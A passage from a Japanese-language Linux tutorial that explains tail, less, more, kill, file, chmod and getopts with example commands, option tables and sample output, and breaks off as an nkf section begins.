477 /
265 *
258 guba.eastmoney.com:443
253
209 /.env
200 www.yahoo.com:443
184 istock.jrj.com.cn:443
suzuki$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dt>:sudo cat filename | grep -v &ldquo;除去したい文字列&rdquo; | awk &lsquo;{ print $2; }'| sort | uniq -c |sort -nr | head</dt>
<dd>これはもはや定番中の定番です。覚えましょう。体に叩き込みましょう。</dd>
</dl>
</div>
<p>head コマンドの紹介の割には長くなりました。</p>
<h2 id=tailコマンド>tailコマンド</h2>
<ul>
<li>tailコマンドでファイルの末尾部分だけを表示する</li>
<li>ログファイルを監視する</li>
<li>ファイルの特定の範囲の行を取り出す（headとtail）</li>
</ul>
<h3 id=概要-3>概要</h3>
<p>headコマンドとは逆に、ファイルの末尾だけ表示するのがtailコマンドです。</p>
<p>ログファイルは、基本ファイルの末尾に新たな記録が追加されます。<br>
「more」コマンドや「less」コマンドで表示しようとすると、末尾まで進むのが面倒だし、ファイルが大きい場合は読み込むのにも時間がかかります。<br>
「tail」コマンドは、ファイルの末尾開かないので手軽で処理も高速です。</p>
<pre tabindex=0><code>$ cat ＜ファイル名＞ | tail 
</code></pre><p>tailコマンドも、headコマンド同様、「-n」オプションで表示する行数を指定することができます。</p>
<pre tabindex=0><code>$ cat ＜ファイル名＞ | tail -n10
</code></pre><p>また、tailコマンド最大の魅力は リアルタイムに出力を追記する tail -fです。<br>
ログ監視などに多用されるこの具体例も以下に示します。</p>
<pre tabindex=0><code>$ sudo tail -f /var/log/httpd/access_log
</code></pre><h3 id=tailコマンドの書式>tailコマンドの書式</h3>
<p>tail [オプション] ファイル名</p>
<h3 id=tailコマンドの主なオプション>tailコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th style=text-align:center>短いオプション</th>
<th>長いオプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td style=text-align:center>-c 数字</td>
<td>&ndash;bytes 数字</td>
<td>末尾の指定したバイト数のみ表示する。「-c 5 b」のように単位を付加することも可能（b=512, KB=1000, K=1024, MB=1000<em>1000, M=1024</em>1024…）</td>
</tr>
<tr>
<td style=text-align:center>-n 数字</td>
<td>&ndash;lines 数字</td>
<td>末尾の指定した行数のみ表示する</td>
</tr>
<tr>
<td style=text-align:center>-q</td>
<td>&ndash;quiet, &ndash;silent</td>
<td>ファイルごとのヘッダ表示を行わない（複数ファイル指定時に使う）</td>
</tr>
<tr>
<td style=text-align:center>-v</td>
<td>&ndash;verbose</td>
<td>常にファイルごとのヘッダ出力を行う</td>
</tr>
<tr>
<td style=text-align:center>-f</td>
<td>&ndash;follow</td>
<td>ファイルを監視して内容が追加されるたびに末尾に表示する（ログ監視などに使用する。［Ctrl］＋［C］キーで終了）</td>
</tr>
</tbody>
</table>
<h3 id=tailコマンド詳細説明>tailコマンド詳細説明</h3>
<h3 id=tailコマンドでファイルの末尾部分だけを表示する>tailコマンドでファイルの末尾部分だけを表示する</h3>
<p>ファイルの末尾を表示します。tail -n で表示行数を変更できます。<br>
tail -n10 と デフォルトの tail は同じ出力となります。</p>
<pre tabindex=0><code>$ cat filename | tail -n10
</code></pre><h3 id=ログファイルを監視する>ログファイルを監視する</h3>
<p>tailコマンドの「-f」オプションを使うと、ログファイルのように、刻々と内容が追加されていくファイル監視ができるようになります。「-f」は、ファイルなどを監視する際、内容が新たに追加されるたびに末尾に表示するオプションです。ログの監視を終了するには、［Ctrl］＋［C］キーを押します。</p>
<pre tabindex=0><code>$ sudo tail -f /var/log/httpd/error_log 
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>tail -f コマンドはとてもよく使います。</dd>
<dd>tail -f を実行するtailf コマンドもあります。(Oによりますが)</dd>
</dl>
</div>
<h3 id=ファイルの特定の範囲の行を取り出すheadとtail>ファイルの特定の範囲の行を取り出す（headとtail）</h3>
<p>ファイル後ろの200行目のところから、ファイル先頭に向かって100行を取り出すにはどうしたらよいか？</p>
<pre tabindex=0><code>cat filename | tail -n200
</code></pre><p>これだとファイル末尾から200行を出力するにすぎない。<br>
tail コマンドのみに頼ろうとすると難しいようだ。<br>
実は、head コマンドも使えば、「後ろ200行の先頭100行」を取り出せる。</p>
<pre tabindex=0><code>$ cat filename | tail -n200 | head -n 100
</code></pre><p>コマンドの実行結果の10001行目から10100行目までが欲しい時は以下の通り。</p>
<pre tabindex=0><code>$ cat filename | head -n10100 | tail -n100
</code></pre><h2 id=lessコマンド>lessコマンド</h2>
<ul>
<li>テキストを1画面ずつ表示する</li>
<li>キー操作のヘルプを表示する</li>
<li>長い行を折り返さずに表示する</li>
<li>ファイルの末尾まで表示したらすぐに終了する</li>
</ul>
<h3 id=概要-4>概要</h3>
<p>「less」コマンドは、テキストファイルを1画面ずつ表示するコマンドです。</p>
<pre tabindex=0><code>$ cat ＜ファイル名＞ | less
</code></pre><p>「less ファイル名」で実行する他、「コマンド | less」のように、別のコマンドの実行結果を1画面ずつ表示する場合にも使われます。</p>
<pre tabindex=0><code>$ dmesg | less 
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>［Enter］キーで1行、スペースキーで1画面先に進める他、上下矢印キーによるスクロールも可能です。表示を終了するには［Q］または［q］キーを入力します。</dd>
</dl>
</div>
<p>　同じ用途のコマンドに「more」があります。lessコマンドはmoreコマンドよりも機能が多く、画面内で検索したり、上にスクロールしたりすることが可能です。</p>
<h3 id=lessコマンドの書式>lessコマンドの書式</h3>
<p>less [オプション] ファイル名<br>
コマンド | less [オプション]</p>
<h3 id=lessコマンドの主なオプション>lessコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th style=text-align:center>短いオプション</th>
<th>長いオプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td style=text-align:center>+行数,-行数</td>
<td></td>
<td>指定した行から表示する</td>
</tr>
<tr>
<td style=text-align:center>+/文字列</td>
<td></td>
<td>指定文字列を検索し、見つけた行から表示する（正規表現によるパターン指定が可能）</td>
</tr>
<tr>
<td style=text-align:center>-p文字列</td>
<td>&ndash;pattern=文字列</td>
<td>指定文字列を検索し、見つけた行から表示する（正規表現によるパターン指定が可能）</td>
</tr>
<tr>
<td style=text-align:center>-oファイル</td>
<td>&ndash;log-file=ファイル</td>
<td>パイプ（｜）などで標準入力から入力した内容を表示する際、指定したファイルにコピーを保存する。既存ファイルを指定した場合は、上書きするか、追加するかを確認するメッセージが表示される</td>
</tr>
<tr>
<td style=text-align:center>-Oファイル</td>
<td>&ndash;LOG-FILE=ファイル</td>
<td>「-o」と同じだが、既存ファイルを指定した場合は、確認せずに上書きする</td>
</tr>
<tr>
<td style=text-align:center>-kファイル名</td>
<td>&ndash;lesskey-file=ファイル名</td>
<td>lesskeyファイル（キー定義ファイル、「lesskey」コマンドで生成）を指定する</td>
</tr>
<tr>
<td style=text-align:center>-L</td>
<td>&ndash;no-lessopen</td>
<td>環境変数LESSOPEN（lessコマンド用のオプションを定義した環境変数）を無視する</td>
</tr>
</tbody>
</table>
<h3 id=lessコマンド詳細説明>lessコマンド詳細説明</h3>
<h3 id=テキストを1画面ずつ表示する>テキストを1画面ずつ表示する</h3>
<pre tabindex=0><code>$ less ＜ファイル名＞
</code></pre><p>で、指定したファイルを1画面ずつ表示します。<br>
次の画面へ進みたい場合はスペースキー、1行ずつ進めたい場合は［Enter］キーを押します。<br>
上下の矢印キーや、［y］または［e］キー、［j］または［k］キーで上下にスクロールすることも可能です。<br>
［q］キーを押すと終了します。</p>
<p>以下のような使い方もできます。</p>
<pre tabindex=0><code>$ cat &lt;filename&gt; | less
</code></pre><h3 id=キー操作のヘルプを表示する>キー操作のヘルプを表示する</h3>
<p>lessコマンドで画面を表示中に［h］キーを押すと、キー操作のヘルプが表示されます。<br>
ヘルプの表示中でもlessコマンドと同様に、上下のスクロールや検索などの操作が可能です。</p>
<p>［q］キーを押すとヘルプの表示を終了し、元の画面に戻ります</p>
<h3 id=長い行を折り返さずに表示する>長い行を折り返さずに表示する</h3>
<p>lessコマンドでは、画面の横幅より長い行は折り返して表示されます。<br>
折り返さずに表示したい場合は、「-S」オプションを使用します。</p>
<p>左右の矢印キーまたは、［ESC］キーに続いて［(］および［)］キーを押すと、左右に半画面分スクロールします。<br>
横スクロールの幅は「-#」オプションで指定できます。　</p>
<pre tabindex=0><code>$ cat filename | less -S
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>［q］キーを押すとヘルプの表示を終了し、元の画面に戻ります。</dd>
</dl>
</div>
<h2 id=moreコマンド>moreコマンド</h2>
<ul>
<li>長いメッセージやテキストファイルを1画面ずつ表示する</li>
<li>テキストを1画面ずつ止めながら表示する</li>
<li>実行結果を止めながら表示したいときにはパイプを使う</li>
<li>確認したい箇所がある場合は「+/オプション」でスキップ</li>
<li>行番号付きで表示したいときはcatコマンドと組み合わせる</li>
<li>moreコマンドで使える主なサブコマンド</li>
</ul>
<h3 id=moreコマンド概要>moreコマンド概要</h3>
<p>moreコマンドは、テキストファイルを1画面ずつ表示するページャコマンドです。</p>
<pre tabindex=0><code>$ more &lt;ファイル名&gt;
</code></pre><p>で実行する他、</p>
<pre tabindex=0><code>$ cat &lt;ファイル名&gt; | more
</code></pre><p>のように他のコマンドの実行結果を1画面ずつ表示する際によく使われます。</p>
<p>　また、moreコマンドにサブコマンドがあり、［Enter］キーで1行、［スペース］キーで1画面先に進み、ファイルの末尾まで表示されると終了します。ファイルを表示している途中でも［Q］キーまたは［q］キーで終了できます。</p>
<h3 id=moreコマンドの書式>moreコマンドの書式</h3>
<p>more [オプション] filename<br>
cat filename | more [オプション]</p>
<h3 id=moreコマンドの主なオプション>moreコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>+数値</td>
<td>数値で指定した行から表示する</td>
</tr>
<tr>
<td>+/文字列</td>
<td>指定した文字列を検索して、見つけた行の2行上から表示する</td>
</tr>
<tr>
<td>-s</td>
<td>連続した空行を1行にする</td>
</tr>
<tr>
<td>-l</td>
<td>改ページを無視する</td>
</tr>
<tr>
<td>-u</td>
<td>下線の処理を行わない</td>
</tr>
<tr>
<td>-数値</td>
<td>画面の行数を指定する</td>
</tr>
<tr>
<td>-f</td>
<td>画面での行数ではなく、データの行数を表示する</td>
</tr>
<tr>
<td>-d</td>
<td>無効なキーが入力された場合には、ビープ音の代わりに簡単なヘルプを表示する</td>
</tr>
</tbody>
</table>
<h3 id=moreコマンド詳細説明>moreコマンド詳細説明</h3>
<p>「cat」コマンドでテキストファイルの内容を表示したら、思ったよりも長くコマンドを実行した結果がどんどん上に流れてしまって、テキストファイルのの最初の方が読めない！ そんなときに便利なのが「more」コマンドです。</p>
<p>moreコマンドは、「more ファイル名」で指定したファイルを1画面ずつ止めながら表示します。次の画面へ進みたいときは［スペース］キーを、1行ずつ画面を進めたいときは［Enter］キーを押します。</p>
<p>ファイルをページャとして読みたい場合</p>
<pre tabindex=0><code>$ cat &lt;filename&gt; | more
</code></pre><p>dmsgなどのシステムファイルをページャとして読みたい</p>
<pre tabindex=0><code>$ dmsg | more 
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>検索を行う場合はページャ画面で「/」記号に続けて検索文字列を入力し、［Enter］キーを押すとその位置までスキップします。nで直前の検索を繰り返します。</dd>
</dl>
</div>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>ファイルを表示している途中でも［Q］キーまたは［q］キーで終了できます。</dd>
</dl>
</div>
<h2 id=killコマンド>killコマンド</h2>
<ul>
<li>killコマンドでプロセスIDを指定してプロセスを終了させる</li>
<li>killallコマンドで名前を指定してプロセスを終了させる</li>
</ul>
<h3 id=killコマンド概要>killコマンド概要</h3>
<p>プロセスを強制終了させます。<br>
killは実行中のプロセスを終了させる場合に使うコマンドです。</p>
<p>killコマンドでプロセスを終了させるには、</p>
<pre tabindex=0><code>$ kill ＜プロセスID＞
</code></pre><p>で指定します。<br>
例えば、100番のプロセスならば</p>
<pre tabindex=0><code>$ kill 100
</code></pre><p>と指定します。<br>
プロセスIDは「ps」コマンドで調べることができます。</p>
<h3 id=killコマンドの書式>killコマンドの書式</h3>
<p>kill [オプション] プロセスID</p>
<h3 id=killコマンドの主なオプション>killコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-s シグナル</td>
<td>プロセスに送るシグナル名または番号。-シグナル名、-番号でも指定可能</td>
</tr>
<tr>
<td>-l</td>
<td>シグナル名のリストを表示する</td>
</tr>
</tbody>
</table>
<h3 id=killコマンド詳細説明>killコマンド詳細説明</h3>
<h3 id=プロセスｉｄでプロセスを終了させる>プロセスＩＤでプロセスを終了させる</h3>
<p>「kill プロセスID」で、指定したプロセスを終了させることができます。プロセスIDは「ps」コマンドで確認できます。</p>
<pre tabindex=0><code>$ kill ＜プロセスＩＤ＞
</code></pre><h3 id=killallコマンドで名前を指定してプロセスを終了させる>killallコマンドで名前を指定してプロセスを終了させる</h3>
<p>「killall 名前」で、“名前”に指定したプロセスを終了させることができます。</p>
<pre tabindex=0><code>$ killall ＜プロセス名＞
</code></pre><h3 id=さまざまなプロセスの調べ方と終了方法>さまざまなプロセスの調べ方と終了方法</h3>
<p>ps aux を使う方法</p>
<pre tabindex=0><code>bash-5.1$ ps axu | grep hugo | grep -v grep
suzukiiichiro    17498   0.0  3.4  5607088 567104 s003  S+   水11AM   2:58.60 hugo -D server
suzukiiichiro    20710   0.0  1.7  5328588 286744 s005  S+   11:38AM   0:13.50 hugo server
bash-5.1$
</code></pre><p>最後の grep -v grep は、grep コマンドでプロセス名を検索したプロセスを除くという意味になります。</p>
<p>さらにawkコマンドでプロセスＩＤを抽出します。</p>
<pre tabindex=0><code>bash-5.1$ ps axu | grep hugo | grep -v grep | awk '{ print $2; }'
17498
20710
bash-5.1$
</code></pre><p>pgrep を使う方法<br>
pgrep は、指定したプロセスのプロセスＩＤを抽出する方法です。</p>
<pre tabindex=0><code>bash-5.1$ pgrep hugo
17498
20710
bash-5.1$
</code></pre><p>プロセスＩＤが解ったところでプロセスを終了します。</p>
<table>
<thead>
<tr>
<th style=text-align:center>表記</th>
<th style=text-align:center>数値</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td style=text-align:center>KILL</td>
<td style=text-align:center>9</td>
<td>プロセスの強制終了命令</td>
</tr>
</tbody>
</table>
<pre tabindex=0><code>$ kill -9 17498
$ kill -9 20710
</code></pre><p>面倒ですね。プロセスがたくさんある場合はとても煩雑です。<br>
xargsコマンドを使うと一片にプロセスを終了させることができます。</p>
<pre tabindex=0><code>bash-5.1$ ps axu | grep hugo | grep -v grep | awk '{ print $2; }' | xargs kill -9
</code></pre><p>終了したいプロセス名が解っている場合は以下のコマンドで一発で全ての同名プロセスを終了させることができます。</p>
<pre tabindex=0><code>$ killall hugo
</code></pre><h2 id=fileコマンド>fileコマンド</h2>
<ul>
<li>ファイルの形式を表示する</li>
<li>ファイルのリストから調べる</li>
<li>シンボリックリンクの参照先を調べる</li>
<li>圧縮されているファイルを調べる</li>
<li>fileコマンドと組み合わせてスクリプトファイルを一覧表示する</li>
<li>whichコマンドと組み合わせてコマンドのファイル形式を調べる</li>
</ul>
<h3 id=fileコマンド概要>fileコマンド概要</h3>
<p>「file」は、ファイル形式を調べるためのコマンドです。「file ファイル名」で、ファイルの形式が表示されます。テキストファイルの場合は、文字コードが表示されます。</p>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>fileコマンドを使わないとできないことがあります。ファイルの拡張子をみて画像ファイルであり、そのファイルタイプはjpgまたはgifという見分けをしますが、それはあくまで見た目の話で、ファイルの内容を確認するためのコマンドがfileコマンドになります。</dd>
</dl>
</div>
<h3 id=fileコマンドの書式>fileコマンドの書式</h3>
<p>file [オプション] ファイル1 ファイル2 ファイル3……</p>
<h3 id=fileコマンドの主なオプション>fileコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-f</td>
<td>リスト 検査するファイルの名前をリストファイルから読み込む</td>
</tr>
<tr>
<td>-L</td>
<td>シンボリックリンクの参照先を調べる</td>
</tr>
<tr>
<td>-z</td>
<td>圧縮ファイルの中も検査する</td>
</tr>
<tr>
<td>-b</td>
<td>出力行の最初にファイル名を表示しない</td>
</tr>
<tr>
<td>-N</td>
<td>出力を整列するためのファイル名への空白の追加を行わない</td>
</tr>
</tbody>
</table>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>一覧のオプションは一部です。 $ man file などで、fileの使い方を確認してください。</dd>
</dl>
</div>
<h3 id=fileコマンド詳細説明>fileコマンド詳細説明</h3>
<h3 id=ファイルの形式を表示する>ファイルの形式を表示する</h3>
<p>システムメッセージを表示する</p>
<pre tabindex=0><code>$ file sample.jpg
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>データファイルの場合は「.jpg」や「.mp3」といった拡張子で判断してしまうのが一般的ですが、fileコマンドの場合は拡張子ではなく、あくまでも“ファイルの内容”から判断します</dd>
</dl>
</div>
<h3 id=ファイルのリストから調べる>ファイルのリストから調べる</h3>
<p>「-f」オプションで、ファイルの一覧を指定することができます。例えば、Linuxの設定ファイル「/etc/shells」にはインストールされているシェルがリストアップされていますが、「file -f /etc/shells」で、それぞれのシェルのファイル形式を調べることができます。</p>
<pre tabindex=0><code>$ file -f /etc/shell
</code></pre><h3 id=シンボリックリンクの参照先を調べる>シンボリックリンクの参照先を調べる</h3>
<p>「-L」オプションで、シンボリックリンクのリンク先を調べることができます。例えば、先ほどの実行結果から「/bin/csh」は、tcshへのシンボリックリンクであることが分かりました。「file -L /bin/csh」で、リンク先であるtcshのファイル形式が表示されます。</p>
<pre tabindex=0><code>$ file -L /bin/tcsh
</code></pre><h3 id=圧縮されているファイルを調べる>圧縮されているファイルを調べる</h3>
<p>「-z」オプションで、圧縮されているファイルの元の形式を調べることができます。</p>
<pre tabindex=0><code>bash-5.1$ file /usr/local/bin/openmpi-1.8.3.tar.gz
/usr/local/bin/openmpi-1.8.3.tar.gz: gzip compressed data, last modified: Thu Sep 25 14:12:57 2014, max compression, from Unix
bash-5.1$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>$ man file などで、fileの使い方を確認してください。</dd>
</dl>
</div>
<h2 id=chmodコマンド>chmodコマンド</h2>
<ul>
<li>パーミッションを表すアルファベットと数値の意味</li>
<li>パーミッションを変更する</li>
<li>パーミッションの変更内容を確認するには？</li>
</ul>
<h3 id=chmodコマンド概要>chmodコマンド概要</h3>
<p>ファイルやディレクトリにアクセスできるかどうかは、ファイルの「パーミッション（許可属性）」によって決まります。このパーミッションを変更するコマンドが「chmod」です。</p>
<h3 id=chmodコマンドの書式>chmodコマンドの書式</h3>
<p>chmod [オプション] モード ファイル1 ファイル2 ファイル3……</p>
<h3 id=chmodコマンドの主なオプション>chmodコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-R</td>
<td>ファイルとディレクトリを再帰的に変更する</td>
</tr>
<tr>
<td>-v</td>
<td>処理した内容を出力する</td>
</tr>
<tr>
<td>-c</td>
<td>変更が行われた場合のみ処理内容を出力する</td>
</tr>
<tr>
<td>-f</td>
<td>ほとんどのエラーメッセージを出力しない</td>
</tr>
</tbody>
</table>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>一覧のオプションは一部です。 $ man chmod などで、chmodの使い方を確認してください。</dd>
</dl>
</div>
<h3 id=chmodコマンド詳細説明>chmodコマンド詳細説明</h3>
<h3 id=パーミッションを表すアルファベットと数値の意味>パーミッションを表すアルファベットと数値の意味</h3>
<table>
<thead>
<tr>
<th>記号</th>
<th>数字</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>r</td>
<td>4</td>
<td>読み</td>
</tr>
<tr>
<td>w</td>
<td>2</td>
<td>書き</td>
</tr>
<tr>
<td>x</td>
<td>1</td>
<td>実行</td>
</tr>
<tr>
<td>-</td>
<td>0</td>
<td>拒否</td>
</tr>
</tbody>
</table>
<p>具体的に以下のように表示される場合、「所有者」「所有グループ」「それ以外」の３桁で表されます。</p>
<p>rw-rw-r&ndash; 664<br>
rwxr-xr-x 755</p>
<p>すくなくとも自分自身はおおむね「所有者」となりますので、</p>
<p>rw-rw-r&ndash; 664<br>
の場合は、所有者（自分自身）は、rw- 6 ですので、<br>
読み・書きはできるものの実行はできない（実行の必要がない）ファイル・ディレクトリということになります。</p>
<p>rwxr-xr-x 755<br>
の場合は、所有者（自分自身）は、rwx 7 ですので、<br>
読み・書き・実行が可能なファイル・ディレクトリであるということになります。</p>
<h3 id=パーミッションを変更する>パーミッションを変更する</h3>
<p>いろいろな方法があります。<br>
一般的には（なにが一般的かもわかりませんが）以下の通りとなります。</p>
<p>sample.txtのパーミッションを664に変更する</p>
<pre tabindex=0><code>$ chmod 664 sample.txt
</code></pre><p>sample.txtのパーミッションを755に変更する</p>
<pre tabindex=0><code>$ chmod 755 sample.txt
</code></pre><h3 id=パーミッションの変更内容を確認するには>パーミッションの変更内容を確認するには？</h3>
<p>　chmodコマンドで「-v」オプションを指定すると、コマンドの実行内容が分かるようになります。パーミッションが変更されなかった場合も、現状がどのようになっているかが分かるように表示されます。</p>
<pre tabindex=0><code>$ chmod -v 755 sample.txt
'sample.txt' のモードを 0664 (rw-rw-r--)から 0775 (rwxrwxr-x)へ変更しました
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>$ chmod コマンドはとても重要、かつセキュリティ上注意が必要なコマンドです。なんでもかんでも777にしておくという大馬鹿ものが後を絶ちませんが、やめましょう。</dd>
</dl>
</div>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>-v オプションは常につけて実行しましょう。何を実行したのかを履歴に残しておくことで振り返って確認することができます。</dd>
</dl>
</div>
<h2 id=getoptsコマンド>getoptsコマンド</h2>
<ul>
<li>オプションを解析する</li>
<li>エラーメッセージを表示しない</li>
<li>引数付きのオプションを使用する</li>
</ul>
<h3 id=getoptsコマンド概要>getoptsコマンド概要</h3>
<p>「getopts」は、bashのシェルスクリプト内でオプションを解析する際に役立つコマンドです。自作のシェルスクリプトで「-a」のような「ハイフン＋アルファベット1文字」のオプションを扱う際に便利です。「-f ファイル名」のように引数を取るオプションも解析できます。</p>
<p>例えばこういうのです</p>
<pre tabindex=0><code>$ head -n10
</code></pre><p>文字列を渡すこともできます</p>
<pre tabindex=0><code>$ grep -f wordlist.txt
</code></pre><p>ということで、自作のスクリプトでこういう事ができるわけです。</p>
<pre tabindex=0><code>$ myScript.sh -n10 -f addressList.txt
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>getoptsとよく似た名前で用途も同じ「getopt」コマンド（/usr/bin/getopt）があります。getoptコマンドはgetoptsとは異なり、「&ndash;」から始まるロングオプションも扱うことができます。</dd>
</dl>
</div>
<h3 id=getoptsコマンドの書式>getoptsコマンドの書式</h3>
<p>getopts オプション文字列 変数名</p>
<h3 id=getoptsコマンドの主なオプション>getoptsコマンドの主なオプション</h3>
<p>getoptsにはオプションはありません。なお、オプション文字列の先頭に「:」記号を入れるかどうかによって、エラーメッセージ表示の有無を変更できます。</p>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>:</td>
<td>エラーメッセージの表示の有無</td>
</tr>
</tbody>
</table>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>一覧のオプションは一部です。 $ man getopts などで、getoptsの使い方を確認してください。</dd>
</dl>
</div>
<h3 id=getoptsコマンド詳細説明>getoptsコマンド詳細説明</h3>
<h3 id=オプションを解析する>オプションを解析する</h3>
<p>オプション「-a」「-b」「-c」を使用し、それぞれのオプションに応じてメッセージを表示します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-Shell:getopts01.sh data-lang=Shell:getopts01.sh><span class=cp>#!/bin/bash
</span><span class=cp></span>
<span class=k>while</span> <span class=nb>getopts</span> abc OPT<span class=p>;</span> <span class=k>do</span>
  <span class=k>case</span> <span class=nv>$OPT</span> in
     a<span class=o>)</span> <span class=nb>echo</span> <span class=s2>&#34;[-a] が指定された&#34;</span><span class=p>;;</span>
     b<span class=o>)</span> <span class=nb>echo</span> <span class=s2>&#34;[-b] が指定された&#34;</span><span class=p>;;</span>
     c<span class=o>)</span> <span class=nb>echo</span> <span class=s2>&#34;[-c] が指定された&#34;</span><span class=p>;;</span>
     *<span class=o>)</span> <span class=nb>echo</span> <span class=s2>&#34;該当なし OPT=</span><span class=nv>$OPT</span><span class=s2> &#34;</span><span class=p>;;</span>
  <span class=k>esac</span>
<span class=k>done</span>
</code></pre></div><p>while getopts abc OPT; do<br>
の abc は、オプションの種類が a,b,cの３種類あることを明示的に指定しています。<br>
OPTは $OPT変数で、 a,b,cがそれぞれ順に代入されます。</p>
<pre tabindex=0><code>$ bash getopts.sh -a
[-a] が指定された
$ bash getopts.sh -ab
[-a] が指定された
[-b] が指定された
$ bash getopts.sh -a -b
[-a] が指定された
[-b] が指定された
$ bash getopts.sh -abc -d
[-a] が指定された
[-b] が指定された
[-c] が指定された
$ bash getopts.sh -abc -d
[-a] が指定された
[-b] が指定された
[-c] が指定された
getopts.sh: 不正なオプションです -- d
該当なし OPT=?
</code></pre><p>以下のオプションは用意されていないことからエラー表示となります。</p>
<pre tabindex=0><code>$ bash getopts.sh -abc -d
[-a] が指定された
[-b] が指定された
[-c] が指定された
getopts.sh: 不正なオプションです -- d
該当なし OPT=?
</code></pre><h3 id=エラーメッセージを表示しない>エラーメッセージを表示しない</h3>
<p>　getoptsに指定していないオプションを使用すると、画面1のように「不正なオプションです &ndash; d」、あるいは「illegal option &ndash; d」のようなメッセージを表示します。</p>
<p>　このようなgetoptsのエラーメッセージを表示したくない場合は、「getopts :abc OPT」のように、オプション文字列の先頭に「:」記号を入れます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-Shell:getopts02.sh data-lang=Shell:getopts02.sh><span class=cp>#!/bin/bash
</span><span class=cp></span>
<span class=k>while</span> <span class=nb>getopts</span> :abc OPT<span class=p>;</span> <span class=k>do</span>
  <span class=k>case</span> <span class=nv>$OPT</span> in
     a<span class=o>)</span> <span class=nb>echo</span> <span class=s2>&#34;[-a] が指定された&#34;</span><span class=p>;;</span>
     b<span class=o>)</span> <span class=nb>echo</span> <span class=s2>&#34;[-b] が指定された&#34;</span><span class=p>;;</span>
     c<span class=o>)</span> <span class=nb>echo</span> <span class=s2>&#34;[-c] が指定された&#34;</span><span class=p>;;</span>
     *<span class=o>)</span> <span class=nb>echo</span> <span class=s2>&#34;該当なし OPT=</span><span class=nv>$OPT</span><span class=s2> &#34;</span><span class=p>;;</span>
  <span class=k>esac</span>
<span class=k>done</span>
</code></pre></div><p>エラーが表示される getopts01.sh</p>
<pre tabindex=0><code>$ bash getopts01.sh -abc -d
[-a] が指定された
[-b] が指定された
[-c] が指定された
getopts01: 不正なオプションです -- d
該当なし OPT=?
</code></pre><p>エラーが表示されない getopts02.sh</p>
<pre tabindex=0><code>$ bash getopts02.sh -abc -d
[-a] が指定された
[-b] が指定された
[-c] が指定された
該当なし OPT=?
</code></pre><h3 id=引数付きのオプションを使用する>引数付きのオプションを使用する</h3>
<p>「-f ファイル名」のように、引数を取るオプションを解析したい場合は、オプション文字の後に「:」記号を付けます。オプションの引数は、組み込み変数「OPTARG」で参照できます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-Shell data-lang=Shell><span class=cp>#!/bin/bash
</span><span class=cp></span>
<span class=k>while</span> <span class=nb>getopts</span> :a:bc: OPT<span class=p>;</span> <span class=k>do</span>
  <span class=k>case</span> <span class=nv>$OPT</span> in
     a<span class=o>)</span> <span class=nb>echo</span> <span class=s2>&#34;[-a] が指定された(引数=</span><span class=nv>$OPTARG</span><span class=s2>)&#34;</span><span class=p>;;</span>
     b<span class=o>)</span> <span class=nb>echo</span> <span class=s2>&#34;[-b] が指定された&#34;</span><span class=p>;;</span>
     c<span class=o>)</span> <span class=nb>echo</span> <span class=s2>&#34;[-c] が指定された(引数=</span><span class=nv>$OPTARG</span><span class=s2>)&#34;</span><span class=p>;;</span>
     :<span class=o>)</span> <span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$OPTARGに引数が指定されていません</span><span class=s2>&#34;</span><span class=p>;;</span>
     ?<span class=o>)</span> <span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$OPTARGは定義されていません</span><span class=s2>&#34;</span><span class=p>;;</span>
  <span class=k>esac</span>
<span class=k>done</span>
</code></pre></div><p>実行結果</p>
<pre tabindex=0><code>$ bash getopts03.sh -a filename -b -c 100
[-a] が指定された 引数=filename
[-b] が指定された
[-c] が指定された 引数=100
$

</code></pre><p>解説<br>
:a:bc:　について</p>
<pre tabindex=0><code>:a   エラー表示をしないというオプションとなります。
a:    -a が指定された場合は引数に数値または文字列を受け取ります。
c:    -c が指定された場合は引数に数値または文字列を受け取ります。
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>アホか。というくらいまぎらわしくてわかりにくい設計で笑えます。一体どこの誰がこんなわかりにくい仕様にしたのでしょう。</dd>
</dl>
</div>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>とにかくシェルクスクリプトで起動パラメータを設定することができました。便利なツールをたくさん作ってください。では</dd>
</dl>
</div>
<h2 id=nkfコマンド>nkfコマンド</h2>
<ul>
<li>文字コードと改行コードを変換する</li>
